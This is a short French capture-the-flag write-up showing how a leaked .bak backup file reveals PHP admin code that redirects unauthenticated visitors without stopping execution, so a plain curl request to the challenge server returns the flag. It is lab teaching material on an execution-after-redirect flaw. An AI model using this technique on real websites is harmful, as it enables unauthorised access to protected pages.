![Screen](../img/Pasted%20image%2020210426185401.png)

Une fois sur le site, dans les commentaires HTML on voit qu'il y a un fichier `.bak`
![Screen](../img/Pasted%20image%2020210426185453.png)

il contient le code suivant:
```php
<?php

if (session_status() == PHP_SESSION_NONE) {
    session_start();
}

if (!(isset($_SESSION["logged"]) && $_SESSION["logged"] === true)) {
    header("Location: /index.php?error=You are not admin !");
}

echo "Flag : " . getenv("FLAG_MARK3TING");
```

Le code est plutôt simple. Si on n'est pas connecté on est redirigé. Seulement, après la redirection il faudrait rajouter `die();`, sinon on peut accéder au reste.
Une petite requête curl, et voilà le flag!
`curl http://chall1.heroctf.fr:9000/admin.php`

![Screen](../img/Pasted%20image%2020210426185710.png)
